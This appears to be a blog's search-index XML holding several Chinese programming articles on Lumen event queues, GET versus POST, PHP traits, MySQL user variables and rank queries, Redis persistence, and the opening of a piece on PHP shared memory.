=&gt; date('Y-m-d H:i:s', $start), 'response_time' =&gt; date('Y-m-d H:i:s', $end), 'ttl' =&gt; $end - $start, 'status' =&gt; $response-&gt;getStatusCode(), ]; // 触发事件 event(new MonitorEvent($params)); &#125; return $response; &#125;&#125; 事件接收器 1234567891011121314151617181920212223242526&lt;?phpnamespace App\Events;use Illuminate\Queue\SerializesModels;abstract class Event&#123; use SerializesModels; /** * Create a new event instance. * * @return void */ public $data; public function __construct($data = []) &#123; $this-&gt;data = $data; &#125; public function getData() &#123; return $this-&gt;data; &#125;&#125; 事件监听处理 123456789101112131415161718192021&lt;?phpnamespace App\Listeners;use App\Events\Event;use App\Http\Controllers\Pub\V1\Logic\MonitorLogic;class MonitorListener extends Listener&#123; /** * Handle the event. * * @param $event * @return mixed */ public function handle(Event $event) &#123; return (new MonitorLogic())-&gt;run($event-&gt;getData()); &#125;&#125; 注册事件处理 123456789101112131415161718&lt;?php namespace App\Providers;use Laravel\Lumen\Providers\EventServiceProvider as ServiceProvider;class EventServiceProvider extends ServiceProvider&#123; /** * The event listener mappings for the application. * * @var array */ protected $listen = [ 'App\Events\MonitorEvent' =&gt; [ 'App\Listeners\MonitorListener', ], ];&#125; 最重要的一步, .env配置中 QUEUE_DRIVER=sync 改为 QUEUE_DRIVER=redis，即把同步队列设置为异步队列。 配置完成，启动队列： php artisan queue:listen]]></content>
  </entry>
  <entry>
    <title><![CDATA[GET和POST的区别]]></title>
    <url>%2Farticles%2FGET%E5%92%8CPOST%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[GET 和 POST 是 HTTP 请求的两种基本方法，要说它们的区别，接触过 WEB 开发的人都能说出一二。最直观的区别就是 GET 把参数包含在 URL 中，POST 通过 request body 传递参数。你可能自己写过无数个 GET 和 POST 请求，或者已经看过很多权威网站总结出的他们的区别，你非常清楚知道什么时候该用什么。当你在面试中被问到这个问题，你的内心充满了自信和喜悦。 你轻轻松松的给出了一个 “标准答案”： GET在浏览器回退时是无害的，而POST会再次提交请求。 GET产生的URL地址可以被Bookmark，而POST不可以。 GET请求会被浏览器主动cache，而POST不会，除非手动设置。 GET请求只能进行url编码，而POST支持多种编码方式。 GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。 GET请求在URL中传送的参数是有长度限制的，而POST么有。 对参数的数据类型，GET只接受ASCII字符，而POST没有限制。 GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。 GET参数通过URL传递，POST放在Request body中。 “很遗憾，这不是我们要的回答！” 如果我告诉你 GET 和 POST 本质上没有区别你信吗？让我们扒下 GET 和 POST 的外衣，坦诚相见吧！ GET 和 POST 是什么？HTTP 协议中的两种发送请求的方法。 HTTP 是什么？HTTP 是基于 TCP/IP 的关于数据如何在万维网中如何通信的协议。 HTTP 的底层是 TCP/IP。所以 GET 和 POST 的底层也是 TCP/IP，也就是说，GET/POST 都是 TCP 链接。GET 和 POST 能做的事情是一样一样的。你要给 GET 加上 request body，给 POST 带上 url 参数，技术上是完全行的通的。 “标准答案” 里的那些区别是怎么回事？ 在我大万维网世界中，TCP 就像汽车，我们用 TCP 来运输数据，它很可靠，从来不会发生丢件少件的现象。但是如果路上跑的全是看起来一模一样的汽车，那这个世界看起来是一团混乱，送急件的汽车可能被前面满载货物的汽车拦堵在路上，整个交通系统一定会瘫痪。为了避免这种情况发生，交通规则 HTTP 诞生了。HTTP 给汽车运输设定了好几个服务类别，有 GET, POST, PUT, DELETE 等等，HTTP 规定，当执行 GET 请求的时候，要给汽车贴上 GET 的标签（设置 method 为 GET），而且要求把传送的数据放在车顶上（url 中）以方便记录。如果是 POST 请求，就要在车上贴上 POST 的标签，并把货物放在车厢里。当然，你也可以在 GET 的时候往车厢内偷偷藏点货物，但是这是很不光彩；也可以在 POST 的时候在车顶上也放一些数据，让人觉得傻乎乎的。HTTP 只是个行为准则，而 TCP 才是 GET 和 POST 怎么实现的基本。 但是，我们只看到 HTTP 对 GET 和 POST 参数的传送渠道（url 还是 requrest body）提出了要求。“标准答案” 里关于参数大小的限制又是从哪来的呢？ 在我大万维网世界中，还有另一个重要的角色：运输公司。不同的浏览器（发起 http 请求）和服务器（接受 http 请求）就是不同的运输公司。 虽然理论上，你可以在车顶上无限的堆货物（url 中无限加参数）。但是运输公司可不傻，装货和卸货也是有很大成本的，他们会限制单次运输量来控制风险，数据量太大对浏览器和服务器都是很大负担。业界不成文的规定是，（大多数）浏览器通常都会限制 url 长度在 2K 个字节，而（大多数）服务器最多处理 64K 大小的 url。超过的部分，恕不处理。如果你用 GET 服务，在 request body 偷偷藏了数据，不同服务器的处理方式也是不同的，有些服务器会帮你卸货，读出数据，有些服务器直接忽略，所以，虽然 GET 可以带 request body，也不能保证一定能被接收到哦。 好了，现在你知道，GET 和 POST 本质上就是 TCP 链接，并无差别。但是由于 HTTP 的规定和浏览器 / 服务器的限制，导致他们在应用过程中体现出一些不同。 你以为本文就这么结束了？ 我们的大 BOSS 还等着出场呢。。。 这位 BOSS 有多神秘？当你试图在网上找 “GET 和 POST 的区别” 的时候，那些你会看到的搜索结果里，从没有提到他。他究竟是什么呢。。。 GET 和 POST 还有一个重大区别，简单的说： GET产生一个TCP数据包；POST产生两个TCP数据包。长的说： 对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）； 而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。 也就是说，GET只需要汽车跑一趟就把货送到了，而POST得跑两趟，第一趟，先去和服务器打个招呼“嗨，我等下要送一批货来，你们打开门迎接我”，然后再回头把货送过去。 因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑！跳入需谨慎。为什么？ GET与POST都有自己的语义，不能随便混用。 据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。 并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。 现在，当面试官再问你 “GET 与 POST 的区别” 的时候，你的内心是不是这样的？]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[php如何实现“多继承”]]></title>
    <url>%2Farticles%2Fphp%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%A7%E6%89%BF%2F</url>
    <content type="text"><![CDATA[Trait自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。 Trait 是为类似 PHP 的单继承语言而准备的一种代码复用机制。Trait 为了减少单继承语言的限制，使开发人员能够自由地在不同层次结构内独立的类中复用 method。Trait 和 Class 组合的语义定义了一种减少复杂性的方式，避免传统多继承和 Mixin 类相关典型问题。 Trait 和 Class 相似，但仅仅旨在用细粒度和一致的方式来组合功能。 无法通过 trait 自身来实例化。它为传统继承增加了水平特性的组合；也就是说，应用的几个 Class 之间不需要继承。 Example #1 Trait 示例12345678910111213141516&lt;?phptrait ezcReflectionReturnInfo &#123; function getReturnType() &#123; /*1*/ &#125; function getReturnDescription() &#123; /*2*/ &#125;&#125;class ezcReflectionMethod extends ReflectionMethod &#123; use ezcReflectionReturnInfo; /* ... */&#125;class ezcReflectionFunction extends ReflectionFunction &#123; use ezcReflectionReturnInfo; /* ... */&#125;?&gt; 优先级从基类继承的成员会被 trait 插入的成员所覆盖。优先顺序是来自当前类的成员覆盖了 trait 的方法，而 trait 则覆盖了被继承的方法。 Example #2 优先顺序示例从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖。其行为 MyHelloWorld 类中定义的方法一致。优先顺序是当前类中的方法会覆盖 trait 方法，而 trait 方法又覆盖了基类中的方法。 123456789101112131415161718192021&lt;?phpclass Base &#123; public function sayHello() &#123; echo 'Hello '; &#125;&#125;trait SayWorld &#123; public function sayHello() &#123; parent::sayHello(); echo 'World!'; &#125;&#125;class MyHelloWorld extends Base &#123; use SayWorld;&#125;$o = new MyHelloWorld();$o-&gt;sayHello();?&gt; 以上例程会输出： Hello World!Example #3 另一个优先级顺序的例子1234567891011121314151617&lt;?phptrait HelloWorld &#123; public function sayHello() &#123; echo 'Hello World!'; &#125;&#125;class TheWorldIsNotEnough &#123; use HelloWorld; public function sayHello() &#123; echo 'Hello Universe!'; &#125;&#125;$o = new TheWorldIsNotEnough();$o-&gt;sayHello();?&gt; 以上例程会输出： Hello Universe!多个 trait通过逗号分隔，在 use 声明列出多个 trait，可以都插入到一个类中。 Example #4 多个 trait 的用法12345678910111213141516171819202122232425&lt;?phptrait Hello &#123; public function sayHello() &#123; echo 'Hello '; &#125;&#125;trait World &#123; public function sayWorld() &#123; echo 'World'; &#125;&#125;class MyHelloWorld &#123; use Hello, World; public function sayExclamationMark() &#123; echo '!'; &#125;&#125;$o = new MyHelloWorld();$o-&gt;sayHello();$o-&gt;sayWorld();$o-&gt;sayExclamationMark();?&gt; 以上例程会输出： Hello World!冲突的解决如果两个 trait 都插入了一个同名的方法，如果没有明确解决冲突将会产生一个致命错误。 为了解决多个 trait 在同一个类中的命名冲突，需要使用 insteadof 操作符来明确指定使用冲突方法中的哪一个。 以上方式仅允许排除掉其它方法，as 操作符可以 为某个方法引入别名。 注意，as 操作符不会对方法进行重命名，也不会影响其方法。 Example #5 冲突的解决在本例中 Talker 使用了 trait A 和 B。由于 A 和 B 有冲突的方法，其定义了使用 trait B 中的 smallTalk 以及 trait A 中的 bigTalk。 Aliased_Talker 使用了 as 操作符来定义了 talk 来作为 B 的 bigTalk 的别名。 12345678910111213141516171819202122232425262728293031323334&lt;?phptrait A &#123; public function smallTalk() &#123; echo 'a'; &#125; public function bigTalk() &#123; echo 'A'; &#125;&#125;trait B &#123; public function smallTalk() &#123; echo 'b'; &#125; public function bigTalk() &#123; echo 'B'; &#125;&#125;class Talker &#123; use A, B &#123; B::smallTalk insteadof A; A::bigTalk insteadof B; &#125;&#125;class Aliased_Talker &#123; use A, B &#123; B::smallTalk insteadof A; A::bigTalk insteadof B; B::bigTalk as talk; &#125;&#125;?&gt; 123Note:在 PHP 7.0 之前，在类里定义和 trait 同名的属性，哪怕是完全兼容的也会抛出 E_STRICT（完全兼容的意思：具有相同的访问可见性、初始默认值）。 修改方法的访问控制使用 as 语法还可以用来调整方法的访问控制。 Example #6 修改方法的访问控制123456789101112131415161718&lt;?phptrait HelloWorld &#123; public function sayHello() &#123; echo 'Hello World!'; &#125;&#125; // 修改 sayHello 的访问控制class MyClass1 &#123; use HelloWorld &#123; sayHello as protected; &#125;&#125;// 给方法一个改变了访问控制的别名// 原版 sayHello 的访问控制则没有发生变化class MyClass2 &#123; use HelloWorld &#123; sayHello as private myPrivateHello; &#125;&#125;?&gt; 从 trait 来组成 trait正如 class 能够使用 trait 一样，其它 trait 也能够使用 trait。在 trait 定义时通过使用一个或多个 trait，能够组合其它 trait 中的部分或全部成员。 Example #7 从 trait 来组成 trait12345678910111213141516171819202122232425&lt;?phptrait Hello &#123; public function sayHello() &#123; echo 'Hello '; &#125;&#125;trait World &#123; public function sayWorld() &#123; echo 'World!'; &#125;&#125;trait HelloWorld &#123; use Hello, World;&#125;class MyHelloWorld &#123; use HelloWorld;&#125;$o = new MyHelloWorld();$o-&gt;sayHello();$o-&gt;sayWorld();?&gt; 以上例程会输出： Hello World!Trait 的抽象成员为了对使用的类施加强制要求，trait 支持抽象方法的使用。 Example #8 表示通过抽象方法来进行强制要求12345678910111213141516171819&lt;?phptrait Hello &#123; public function sayHelloWorld() &#123; echo 'Hello'.$this-&gt;getWorld(); &#125; abstract public function getWorld();&#125;class MyHelloWorld &#123; private $world; use Hello; public function getWorld() &#123; return $this-&gt;world; &#125; public function setWorld($val) &#123; $this-&gt;world = $val; &#125;&#125;?&gt; Trait 的静态成员Traits 可以被静态成员静态方法定义。 Example #9 静态变量1234567891011121314151617181920&lt;?phptrait Counter &#123; public function inc() &#123; static $c = 0; $c = $c + 1; echo "$c\n"; &#125;&#125;class C1 &#123; use Counter;&#125;class C2 &#123; use Counter;&#125;$o = new C1(); $o-&gt;inc(); // echo 1$p = new C2(); $p-&gt;inc(); // echo 1?&gt; Example #10 静态方法12345678910111213&lt;?phptrait StaticExample &#123; public static function doSomething() &#123; return 'Doing something'; &#125;&#125;class Example &#123; use StaticExample;&#125; Example::doSomething();?&gt; 属性Trait 同样可以定义属性。 Example #11 定义属性123456789101112&lt;?phptrait PropertiesTrait &#123; public $x = 1;&#125;class PropertiesExample &#123; use PropertiesTrait;&#125;$example = new PropertiesExample;$example-&gt;x;?&gt; Trait 定义了一个属性后，类就不能定义同样名称的属性，否则会产生 fatal error。 有种情况例外：属性是兼容的（同样的访问可见度、初始默认值）。 在 PHP 7.0 之前，属性是兼容的，则会有 E_STRICT 的提醒。 Example #12 解决冲突123456789101112&lt;?phptrait PropertiesTrait &#123; public $same = true; public $different = false;&#125;class PropertiesExample &#123; use PropertiesTrait; public $same = true; // PHP 7.0.0 后没问题，之前版本是 E_STRICT 提醒 public $different = true; // 致命错误&#125;?&gt;]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[mysql中的用户变量]]></title>
    <url>%2Farticles%2Fmysql%E4%B8%AD%E7%9A%84%E7%94%A8%E6%88%B7%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[前言LeetCode上有一道SQL练习题感觉很有必要备注一下。 1234567891011121314151617181920【中等】180.编写一个 SQL 查询，查找所有至少连续出现三次的数字。+----+-----+| Id | Num |+----+-----+| 1 | 1 || 2 | 1 || 3 | 1 || 4 | 2 || 5 | 1 || 6 | 2 || 7 | 2 |+----+-----+例如，给定上面的 Logs 表， 1 是唯一连续出现至少三次的数字。+-----------------+| ConsecutiveNums |+-----------------+| 1 |+-----------------+ 题解： ID是连续的： 12345678910111213SELECT *FROM Logs l1, Logs l2, Logs l3WHERE l1.Id = l2.Id - 1 AND l2.Id = l3.Id - 1 AND l1.Num = l2.Num AND l2.Num = l3.Num/*利用了ID连续，前后ID相差1的特性来确定，缺点也很明显, 数据必须保证前后ID是连续的且不断裂的*/ ID连续性不确定： 123456789101112131415161718192021222324SELECT DISTINCT Num AS ConsecutiveNumsFROM ( SELECT Num, CASE WHEN @prev = Num THEN @count := @count + 1 WHEN (@prev := Num) IS NOT NULL THEN @count := 1 END AS CNT FROM LOGS, ( SELECT @prev := NULL ,@count := NULL ) AS t ) AS tempWHERE temp.CNT &gt;= 3/*利用用户变量实现对连续出现的值进行计数,与自关联或自连接相比，这种方法的效率更高，不受Logs表中的Id是否连续的限制，而且可以任意设定某个值连续出现的次数。*/ MySQL的变量分类MySQL变量一共分为两大类：用户自定义变量和系统变量。如下： 用户自定义变量 局部变量 会话变量 系统变量 会话变量 全局变量 局部变量局部变量一般用于SQL的语句块中，比如存储过程中的begin和end语句块。其作用域仅限于该语句块内。生命周期也仅限于该存储过程的调用期间。 1234567891011drop procedure if exists _procedure_test;create procedure _procedure_test( in a int, in b int)begin declare c int default 0; set c = a + b; select c as c;end; 上述存储过程中定义的变量c就是局部变量。 会话变量会话变量即为服务器为每个客户端连接维护的变量。在客户端连接时，使用相应全局变量的当前值对客户端的回话变量进行初始化。设置会话变量不需要特殊权限，但客户端只能更改自己的会话变量。其作用域与生命周期均限于当前客户端连接。 会话变量的赋值： 123mysql&gt; set session var_name = value;mysql&gt; set @@session.var_name = value;mysql&gt; set var_name = value; 会话变量的查询： 123mysql&gt; select @@var_name;mysql&gt; select @@session.var_name;mysql&gt; show session variables like "%var%"; 全局变量全局变量影响服务器整体操作。当服务器启动时，它将所有全局变量初始化为默认值。这些默认值可以在选项文件中或在命令行中指定的选项进行更改。要想更改全局变量，必须具有SUPER权限。全局变量作用于server的整个生命周期，但是不能跨重启。即重启后所有设置的全局变量均失效。要想让全局变量重启后继续生效，需要更改相应的配置文件。 全局变量的设置： 12mysql&gt; set global var_name = value; //注意：此处的global不能省略。根据手册，set命令设置变量时若不指定GLOBAL、SESSION或者LOCAL，默认使用SESSIONmysql&gt; set @@global.var_name = value; //同上 全局变量的查询： 12mysql&gt; select @@global.var_name;mysql&gt; show global variables like "%var%"; 自定义变量你可以利用SQL语句将值存储在用户自定义变量中，然后再利用另一条SQL语句来查询用户自定义变量。这样以来，可以再不同的SQL间传递值。 用户自定义变量的声明方法形如：@var_name，其中变量名称由字母、数字、“.”、“_”和“$”组成。当然，在以字符串或者标识符引用时也可以包含其他字符（例如：@’my-var’，@”my-var”，或者@my-var）。 用户自定义变量是会话级别的变量。其变量的作用域仅限于声明其的客户端链接。当这个客户端断开时，其所有的会话变量将会被释放。 用户自定义变量是不区分大小写的。 使用SET语句来声明用户自定义变量： 1mysql&gt; SET @var_name = expr[, @var_name = expr] ... 在使用SET设置变量时，可以使用 = 或者 := 操作符进行赋值。 当然，除了SET语句还有其他赋值的方式。比如下面这个例子，但是赋值操作符只能使用 := , 因为 = 操作符将会被认为是比较操作符。 1234567mysql&gt; SET @t1 = 1, @t2 = 2, @t3 := 4;mysql&gt; SELECT @t1, @t2, @t3, @t4 := @t1 + @t2 + @t3;+------+------+------+--------------------+| @t1 | @t2 | @t3 | @t4 := @t1+@t2+@t3 |+------+------+------+--------------------+| 1 | 2 | 4 | 7 |+------+------+------+--------------------+ 用户变量的类型仅限于：整形、浮点型、二进制与非二进制串和NULL。在赋值浮点数时，系统不会保留精度。其他类型的值将会被转成相应的上述类型。比如：一个包含时间或者空间数据类型（temporal or spatial data type）的值将会转换成一个二进制串。 如果用户自定义变量的值以结果集形式返回，系统会将其转换成字符串形式。 如果查询一个没有初始化的变量，将会以字符串类型返回NULL。 不要在同一个非SET语句中同时赋值并使用同一个用户自定义变量 用户自定义变量可以用于很多上下文中。但是目前并不包括那些显式使用常量的表达式中，比如SELECT中的LIMIT子句，或者LOAD DATA中的IGNORE N LINES的字句中。 通常来说，除了在SET语句中，不要再同一个SQL语句中同时赋值并使用同一个用户自定义变量。举个变量自增的例子，下面的是没问题的： 1mysql&gt; SET @a = @a + 1; 对于其他语句，比如SELECT，也许会得到期望的效果，但这真心不靠谱。比如下面的语句，也许你自然地会认为MySQL会先执行@a的值，然后再进行赋值操作： 1mysql&gt; SELECT @a, @a:=@a+1, ...; 然而，用户自定义变量表达式的计算顺序还没有定义呢。 除此之外，还有另一个问题。变量的默认返回类型由语句开始时的类型决定的，正如下面的例子： 12mysql&gt; SET @a='test';mysql&gt; SELECT @a,(@a:=20) FROM tbl_name; 上述的SELECT语句中，MySQL会报告给客户端第一列的字段类型为字符串，同时将所有对@a变量的使用均转换为字符串处理，尽管在SELECT语句中将@a变量设置为数字类型。在SELECT语句执行后，@a变量才会在下一个语句中识别为数字类型。 为了避免上述问题的发生，要么不在同一个语句中同时赋值并使用变量，要么在使用之前，将变量设置为0，0.0，或者’’，以确定它的数据类型。 变量的值是在SQL发送到客户端后才计算的 在SELECT语句中，在每一个select表达式被发送给客户端后，才会进行计算。这就意味着，在形如HAVING，GROUP BY和ORDER BY只句中有使用在当前select表达式定义的变量的情况下，该语句将不会得到如期的效果。 1mysql&gt; SELECT (@aa:=id) AS a, (@aa+3) AS b FROM tbl_name HAVING b=5; 上述在HAVING只句中使用了在当前的select列表中定义的别名b，其使用了变量@aa。这条语句并不会得到如期的效果：@aa变量为上一次SQL语句执行的结果集中的ID值，并非当前的。 例 : 在MySQL中实现Rank高级排名函数除了上面题目中的示例，这里给出另外一个常用的示例： MySQL中没有Rank排名函数，当我们需要查询排名时，我们可以利用自定义变量来达到Rank函数一样的高级排名效果。 首先我们先创建一个我们需要进行高级排名查询的players表， pid name age 1 Samual 25 2 Vino 20 3 John 20 4 Andy 22 5 Brian 21 6 Dew 24 7 Kris 25 8 William 26 9 George 23 10 Peter 19 11 Tom 20 12 Andre 20 实现Rank普通排名函数在这里，我们希望获得一个排名字段的列，以及age的升序排列。所以我们的查询语句将是： 123SELECT pid, name, age, @curRank := @curRank + 1 AS rankFROM players p, (SELECT @curRank := 0) qORDER BY age PID NAME AGE RANK 10 Peter 19 1 12 Andre 20 2 2 Vino 20 3 3 John 20 4 11 Tom 20 5 5 Brian 21 6 4 Andy 22 7 9 George 23 8 6 Dew 24 9 7 Kris 25 10 1 Samual 25 11 8 William 26 12 要在mysql中声明一个变量，你必须在变量名之前使用@符号。FROM子句中的(@curRank := 0)部分允许我们进行变量初始化，而不需要单独的SET命令。当然，也可以使用SET，但它会处理两个查询： 1234SET @curRank := 0;SELECT pid, name, age, @curRank := @curRank + 1 AS rankFROM playersORDER BY age 实现Rank查询以降序排列首要按age的降序排列，其次按name进行排列，只需修改查询语句加上ORDER BY和 DESC以及列名即可。 123SELECT pid, name, age, @curRank := @curRank + 1 AS rankFROM players p, (SELECT @curRank := 0) qORDER BY age DESC, name PID NAME AGE RANK 8 William 26 1 7 Kris 25 2 1 Samual 25 3 6 Dew 24 4 9 George 23 5 4 Andy 22 6 5 Brian 21 7 12 Andre 20 8 3 John 20 9 11 Tom 20 10 2 Vino 20 11 10 Peter 19 12 实现Rank普通并列排名函数现在，如果我们希望为并列数据的行赋予相同的排名，则意味着那些在排名比较列中具有相同值的行应在MySQL中计算排名时保持相同的排名(例如在我们的例子中的age)。为此，我们使用了一个额外的变量。 1234567SELECT pid, name, age,CASEWHEN @prevRank = age THEN @curRankWHEN @prevRank := age THEN @curRank := @curRank + 1END AS rankFROM players p, (SELECT @curRank :=0, @prevRank := NULL) rORDER BY age PID NAME AGE RANK 10 Peter 19 1 12 Andre 20 2 2 Vino 20 2 3 John 20 2 11 Tom 20 2 5 Brian 21 3 4 Andy 22 4 9 George 23 5 6 Dew 24 6 7 Kris 25 7 1 Samual 25 7 8 William 26 8 如上所示，具有相同数据和排行的两行或多行，它们都会获得相同的排名。玩家Andre, Vino, John 和Tom都有相同的age，所以他们排名并列第二。下一个最高age的玩家(Brian)排名第3。这个查询相当于MSSQL和ORACLE 中的DENSE_RANK()函数。 实现Rank高级并列排名函数当使用RANK()函数时，如果两个或以上的行排名并列，则相同的行都会有相同的排名，但是实际排名中存在有关系的差距。 1234567SELECT pid, name, age, rank FROM(SELECT pid, name, age, @curRank := IF(@prevRank = age, @curRank, @incRank) AS rank, @incRank := @incRank + 1, @prevRank := age FROM players p, (SELECT @curRank :=0, @prevRank := NULL, @incRank := 1) r ORDER BY age ) s 这是一个查询中的子查询。我们使用三个变量(@incRank，@prevRank，@curRank)来计算关系的情况下，在查询结果中我们已经补全了因为并列而导致的排名空位。我们已经封闭子查询到查询。这个查询相当于MSSQL和ORACLE中的RANK()函数。 PID NAME AGE RANK 10 Peter 19 1 12 Andre 20 2 2 Vino 20 2 3 John 20 2 11 Tom 20 2 5 Brian 21 6 4 Andy 22 7 9 George 23 8 6 Dew 24 9 7 Kris 25 10 1 Samual 25 10 8 William 26 12 在这里我们可以看到，Andre，Vino，John和Tom都有相同的age，所以他们排名并列第二。下一个最高年龄的球员(Brian)排名第6，而不是第3，因为有4个人并列排名在第2。 好的，通过本文加深对sql的运用，也希望你能从中获取收获。 参考链接: 深入MySQL用户自定义变量 胡小旭在MySQL中实现Rank高级排名函数 风澈vio]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[redis持久化]]></title>
    <url>%2Farticles%2Fredis%E6%8C%81%E4%B9%85%E5%8C%96%2F</url>
    <content type="text"><![CDATA[前言Redis是一种高级key-value数据库。它跟memcached类似，不过数据可以持久化，而且支持的数据类型很丰富。有字符串，链表，集 合和有序集合。支持在服务器端计算集合的并，交和补集(difference)等，还支持多种排序功能。所以Redis也可以被看成是一个数据结构服务 器。Redis的所有数据都是保存在内存中，然后不定期的通过异步方式保存到磁盘上(这称为“半持久化模式”)；也可以把每一次数据变化都写入到一个append only file(aof)里面(这称为“全持久化模式”)。 由于Redis的数据都存放在内存中，如果没有配置持久化，redis重启后数据就全丢失了，于是需要开启redis的持久化功能，将数据保存到磁 盘上，当redis重启后，可以从磁盘中恢复数据。redis提供两种方式进行持久化，一种是RDB持久化（原理是将Reids在内存中的数据库记录定时 dump到磁盘上的RDB持久化），另外一种是AOF（append only file）持久化（原理是将Reids的操作日志以追加的方式写入文件）。那么这两种持久化方式有什么区别呢，改如何选择呢？网上看了大多数都是介绍这两 种方式怎么配置，怎么使用，就是没有介绍二者的区别，在什么应用场景下使用。 二者的区别RDB持久化是指在指定的时间间隔内将内存中的数据集快照写入磁盘，实际操作过程是fork一个子进程，先将数据集写入临时文件，写入成功后，再替换之前的文件，用二进制压缩存储。 AOF持久化以日志的形式记录服务器所处理的每一个写、删除操作，查询操作不会记录，以文本的方式记录，可以打开文件看到详细的操作记录。 二者优缺点RDB 优势 1). 一旦采用该方式，那么你的整个Redis数据库将只包含一个文件，这对于文件备份而言是非常完美的。比如，你可能打算每个小时归档一次最近24小时的数 据，同时还要每天归档一次最近30天的数据。通过这样的备份策略，一旦系统出现灾难性故障，我们可以非常容易的进行恢复。 2). 对于灾难恢复而言，RDB是非常不错的选择。因为我们可以非常轻松的将一个单独的文件压缩后再转移到其它存储介质上。 3). 性能最大化。对于Redis的服务进程而言，在开始持久化时，它唯一需要做的只是fork出子进程，之后再由子进程完成这些持久化的工作，这样就可以极大的避免服务进程执行IO操作了。 4). 相比于AOF机制，如果数据集很大，RDB的启动效率会更高。 劣势 1). 如果你想保证数据的高可用性，即最大限度的避免数据丢失，那么RDB将不是一个很好的选择。因为系统一旦在定时持久化之前出现宕机现象，此前没有来得及写入磁盘的数据都将丢失。 2). 由于RDB是通过fork子进程来协助完成数据持久化工作的，因此，如果当数据集较大时，可能会导致整个服务器停止服务几百毫秒，甚至是1秒钟。 AOF 优势 1). 该机制可以带来更高的数据安全性，即数据持久性。Redis中提供了3中同步策略，即每秒同步、每修改同步和不同步。事实上，每秒同步也是异步完成的，其 效率也是非常高的，所差的是一旦系统出现宕机现象，那么这一秒钟之内修改的数据将会丢失。而每修改同步，我们可以将其视为同步持久化，即每次发生的数据变 化都会被立即记录到磁盘中。可以预见，这种方式在效率上是最低的。至于无同步，无需多言，我想大家都能正确的理解它。 2). 由于该机制对日志文件的写入操作采用的是append模式，因此在写入过程中即使出现宕机现象，也不会破坏日志文件中已经存在的内容。然而如果我们本次操 作只是写入了一半数据就出现了系统崩溃问题，不用担心，在Redis下一次启动之前，我们可以通过redis-check-aof工具来帮助我们解决数据 一致性的问题。 3). 如果日志过大，Redis可以自动启用rewrite机制。即Redis以append模式不断的将修改数据写入到老的磁盘文件中，同时Redis还会创 建一个新的文件用于记录此期间有哪些修改命令被执行。因此在进行rewrite切换时可以更好的保证数据安全性。 4). AOF包含一个格式清晰、易于理解的日志文件用于记录所有的修改操作。事实上，我们也可以通过该文件完成数据的重建。 劣势 1). 对于相同数量的数据集而言，AOF文件通常要大于RDB文件。RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快。 2). 根据同步策略的不同，AOF在运行效率上往往会慢于RDB。总之，每秒同步策略的效率是比较高的，同步禁用策略的效率和RDB一样高效。 二者选择的标准，就是看系统是愿意牺牲一些性能，换取更高的缓存一致性（aof），还是愿意写操作频繁的时候，不启用备份来换取更高的性能，待手动运行save的时候，再做备份（rdb）。rdb这个就更有些 eventually consistent的意思了。 常用配置 RDB持久化配置 Redis会将数据集的快照dump到dump.rdb文件中。此外，我们也可以通过配置文件来修改Redis服务器dump快照的频率，在打开6379.conf文件之后，我们搜索save，可以看到下面的配置信息： 12345save 900 1 # 在900秒(15分钟)之后，如果至少有1个key发生变化，则dump内存快照。save 300 10 # 在300秒(5分钟)之后，如果至少有10个key发生变化，则dump内存快照。save 60 10000 # 在60秒(1分钟)之后，如果至少有10000个key发生变化，则dump内存快照。 AOF持久化配置 在Redis的配置文件中存在三种同步方式，它们分别是： 12345appendfsync always # 每次有数据修改发生时都会写入AOF文件。appendfsync everysec # 每秒钟同步一次，该策略为AOF的缺省策略。appendfsync no # 从不同步。高效但是数据不会被持久化。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用 PHP 直接在共享内存中存储数据集]]></title>
    <url>%2Farticles%2F%E4%BD%BF%E7%94%A8-PHP-%E7%9B%B4%E6%8E%A5%E5%9C%A8%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E4%B8%AD%E5%AD%98%E5%82%A8%E6%95%B0%E6%8D%AE%E9%9B%86%2F</url>
    <content type="text"><![CDATA[概述共享内存是一种在相同机器中的应用程序之间交换数据的有效方式。一个进程可创建一个可供其他进程访问的内存段，只要它分配了正确的权限。每个内存段拥有一个惟一的 ID（称为 shmid），这个 ID 指向一个物理内存区域，其他进程可在该区域操作它。创建并提供了合适的权限之后，同一台机器中的其他进程就可以操作这些内存段：读取、写入和删除。 这表明使用 C 语言编写的应用程序可与使用其他语言（比如 Java™ 或 PHP）编写的应用程序共享信息。它们都可以共享信息，只要它们可访问和理解该信息。共享内存在针对大部分语言的实现中得到了广泛使用，所以访问应该不是问题。要理解信息，我们可以使用一种标准格式，比如 XML 或 JSON。 共享内存的使用是一种在进程之间交换数据的快速方法，主要因为在创建内存段之后传递数据，不会涉及内核。这种方法常常称为进程间通信 (IPC)。其他 IPC 方法包括管道、消息队列、RPC 和套接字。当使用需要彼此通信的应用程序的生态系统时，这种在应用程序之间快速、可靠地交换数据的能力非常有用。取决于生态系统的大小，使用数据库在应用程序之间交换信息的常用方法常常会导致查询缓慢，甚至 I/O 阻塞。使用共享内存，没有 I/O 会减缓开发人员的进度。 本文的提议非常简单，学习如何使用 PHP 创建和操作共享内存段，使用它们存储可供其他应用程序使用的数据集。即使没有使用共享内存交换数据的计划，它本身也在许多好处，因为它使应用程序能够远离 I/O 